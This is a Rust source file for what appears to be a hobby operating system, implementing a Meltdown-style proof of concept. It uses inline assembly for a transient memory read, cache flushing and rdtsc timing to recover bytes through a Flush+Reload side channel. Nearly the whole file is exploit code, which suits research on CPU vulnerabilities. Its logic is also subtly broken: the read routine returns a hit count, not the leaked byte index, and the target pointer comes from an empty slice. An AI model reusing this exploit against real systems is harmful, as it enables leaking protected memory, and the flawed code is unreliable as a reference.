#![no_std]

extern crate alloc;

#[allow(unused_imports)]
use runtime::*;
use terminal::{print, println};
use alloc::vec::Vec;
use core::{ptr, mem};
use alloc::alloc::{alloc, dealloc, handle_alloc_error, Layout};
use signal::signal_vector::SignalVector;
use signal::signal_handler::SignalHandler;
use syscall;
use syscall::SystemCall::SignalHandlerRegister;

use core::arch::asm;

const PAGE_SIZE: usize = 256;

#[derive(Copy, Clone, Debug)] // Required to initialize an entire array with such objects
#[allow(dead_code)]
pub struct MemoryPage([u128; PAGE_SIZE]);

pub struct Config {
	measurements: u32,
	accept_after: u32,
	retries: u32,
}

pub fn meltdown_fast(mem: &[MemoryPage], pointer: *const u8) {
    unsafe {
        asm!(
            "mov {tmp}, [{x}]",
            "shl {tmp}, 12",
            "mov {tmp2}, [{base}+{tmp}]",
            x = in(reg) pointer,
            base = in(reg) &mem[0] as *const MemoryPage,
            tmp = out(reg) _,
            tmp2 = out(reg) _,
        );
    }
}

pub fn rdtsc() -> u64 {
    let high: u32;
    let low: u32;
    unsafe {
        asm!(
            "rdtsc",
            out("eax") low,
            out("edx") high
        );
    }
    ((high as u64) << 32) | (low as u64)
}

pub fn maccess(pointer: *const MemoryPage) {
    unsafe {
        asm!(
            "mov {tmp}, [{x}]",
            x = in(reg) pointer,
            tmp = out(reg) _,
        );
    }
}

pub fn flush(pointer: *const MemoryPage) {
    unsafe {
        asm!(
            "clflush [{x}]",
            x = in(reg) pointer,
        );
    }
}

pub fn flush_reload(cache_miss_threshold: u64, pointer: *const MemoryPage) -> bool {
    let start_time: u64;
    let end_time: u64;
    
    start_time = rdtsc();
    maccess(pointer);
    end_time = rdtsc();
    
    flush(pointer); // The entry is probably cached now no matter whether it was cached before, flush it so we don't expell the entry we are looking for from the cache by caching all other entries
    
    end_time - start_time < cache_miss_threshold
}

struct SegfaultHandler {
	
}

impl SignalHandler for SegfaultHandler {
	fn trigger(&self) {
		println!("Signal handler triggered!");
	}
}

// Debugging only
pub fn handle_signal() {
	println!("Handling signal. This means we successfully jumped back into userspace!");
}

pub fn libkdump_read_signal_handler(config: &Config, cache_miss_threshold: u64, mem: &[MemoryPage], pointer: *const u8) -> usize {
	for _ in 0..config.retries {
		// TODO: Set segmentation fault callback position
		meltdown_fast(mem, pointer);
			
		for i in 0..mem.len() {
			if flush_reload(cache_miss_threshold, &mem[i] as *const MemoryPage) {
				if i >= 1 { // TODO why ignore first entry?
					return i;
				}
			}
			// TODO: original has sched_yield(); here
		}
		// TODO: original has sched_yield(); here
	}
	
	return 0;
}

pub fn libkdump_read(config: &Config, cache_miss_threshold: u64, mem: &[MemoryPage], pointer: *const u8) -> u32 {
	const ARRAY_SIZE: usize = 256;
	let mut res_stat: [u32; ARRAY_SIZE] = [0; ARRAY_SIZE];
	
	// TODO: original has sched_yield(); here
	
	for _ in 0..config.measurements {
		// TODO: Add implementation using TSX?
		let r = libkdump_read_signal_handler(config, cache_miss_threshold, mem, pointer);
		res_stat[r] += 1;
	}
	
	let max_i = *res_stat.iter().max().expect("Couldn't find maximum!");
	if max_i > config.accept_after {
		max_i
	} else {
		0
	}
}

pub fn detect_flush_reload_threshold(pointer: *const MemoryPage) -> u64{
    let mut reload_time: u64 = 0;
    let mut flush_reload_time: u64 = 0;
    let count: u64 = 10000;
    let mut start_time: u64;
    let mut end_time: u64;
    
    // TODO Use single value instead of array ok?    
    maccess(pointer);
    for _ in 0..count {
        start_time = rdtsc();
        maccess(pointer);
        end_time = rdtsc();
        reload_time += end_time - start_time;
    }
    
    for _ in 0..count {
        start_time = rdtsc();
        maccess(pointer);
        end_time = rdtsc();
        flush(pointer);
        flush_reload_time += end_time - start_time;
    }
    
    println!("Total time: reload: {} flush+reload: {}", reload_time, flush_reload_time);
    reload_time /= count;
    flush_reload_time /= count;
    println!("Average time: reload: {} flush+reload: {}", reload_time, flush_reload_time);
    let threshold = (flush_reload_time + reload_time * 2) / 3;
    println!("Threshold: {}", threshold);
    return threshold;
}

#[unsafe(no_mangle)]
pub fn main() {
    println!("Meltdown start\n");
    println!("Address of handle_signal is {:x}", handle_signal as u64);
    syscall::syscall(SignalHandlerRegister, &[SignalVector::SIGSEGV as usize, handle_signal as usize]);
    const ARRAY_SIZE: usize = 256; // 256 entries, each containing 256 u128's, meaning 256*4K
    const SECRET: &str = "Whoever reads this is dumb.";
    let default_config = Config {
		measurements: 3,
		accept_after: 1,
		retries: 1000,
	};
	
	let ptr;
	let layout;
	let mut mem: Vec<MemoryPage>;
	let total_memory = mem::size_of::<MemoryPage>() * ARRAY_SIZE;
	
	unsafe {
		layout = Layout::from_size_align(total_memory, 4096).expect("Layout creation failed");
		ptr = alloc(layout);
		if ptr.is_null() {
			handle_alloc_error(layout);
		}
		ptr::write_bytes(ptr, 0, total_memory);
		mem = Vec::from_raw_parts(ptr as *mut MemoryPage, ARRAY_SIZE, ARRAY_SIZE);
	}
    
    for i in 0..ARRAY_SIZE {
		let mut sum;
		let mut cur_ptr;
		cur_ptr = &mem[i] as *const MemoryPage;
		sum = mem[i].0.iter().sum::<u128>();
		//println!("{}, {:p}: {}", i, cur_ptr, sum);
		
		assert_eq!((cur_ptr as usize) % 4096, 0); // Check whether all elements are 4K aligned
		assert_eq!(0, sum); // Check whether all elements are initialised with 0
		
		flush(cur_ptr);
	}
	
	println!("Current CPU time: {}", rdtsc());
	let cache_miss_threshold = detect_flush_reload_threshold(&mem[0] as *const MemoryPage);
    
    let mut index: usize = 0;
    while index < SECRET.len() {
		let value = libkdump_read(&default_config, cache_miss_threshold, &mem, SECRET[index..index].as_ptr());
		println!("Got value: {}", value);
		index += 1;
	}
	
	unsafe {
		dealloc(ptr, layout);
	}
}
